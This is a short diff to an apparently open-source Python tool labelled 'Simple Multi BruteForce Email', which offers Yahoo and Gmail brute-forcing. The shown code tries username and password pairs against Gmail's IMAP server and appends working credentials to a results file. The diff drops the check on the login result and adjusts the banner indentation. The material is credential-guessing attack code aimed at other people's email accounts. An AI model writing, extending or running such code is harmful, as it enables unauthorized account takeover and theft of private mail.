@@ -38,9 +38,8 @@ try:
 		try:
 			m = imaplib.IMAP4_SSL("imap.gmail.com",993)
 			rc, resp = m.login(arg,pas)
-			if 'Ok' in str(rc):
-				sts='ntaps'
-				G.append(sts)
+			sts='ntaps'
+			G.append(sts)
 			print("[+] "+str(resp).replace('b',''))
 			wrt="[GMAIL] %s => %s\n"%(arg,pas)
 			fil3=open('result/Gmail.txt','a')
@@ -51,7 +50,7 @@ try:
 	os.system('clear')
 	print("""
 	[Simple Multi BruteForce Email]
-		[By:KANG-NEWBIE]
+	        [By:KANG-NEWBIE]
 1. Brute Yahoo
 2. Brute Gmail
 	""")
